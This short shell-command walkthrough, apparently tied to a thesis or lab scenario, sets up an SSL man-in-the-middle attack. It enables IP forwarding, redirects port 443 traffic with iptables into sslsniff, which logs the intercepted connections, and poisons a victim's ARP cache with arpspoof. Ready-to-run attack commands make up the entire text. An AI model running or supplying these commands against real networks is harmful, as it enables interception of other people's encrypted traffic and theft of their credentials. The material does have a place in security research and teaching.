# SETUP YOUR ATTACKER ON THE ROUTER
# NATed subnet is: 192.168.1.0/14

# Set up scenario as in attack_scenario.pdf
# (section-6.1.pdf is an excerpt from Thomas's thesis, showing the ideas he followed)
# (use your own routable IP addresses, of course)

# Enable IP forwarding on your router
echo 1 > /proc/sys/net/ipv4/ip_forward

# Add a iptables-rule to intercept SSL traffic
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 999

# Set up sslsniff to intercept all SSL-connections for which 
# there are certificates in the /home/YOURUSER/certs-folder
sslsniff -t -c /home/YOURUSER/certs -s 999 -w /home/YOURUSER/log.log

# Poison the victim's ARP cache
arpspoof -i eth0 -t 192.168.1.148 192.168.1.1
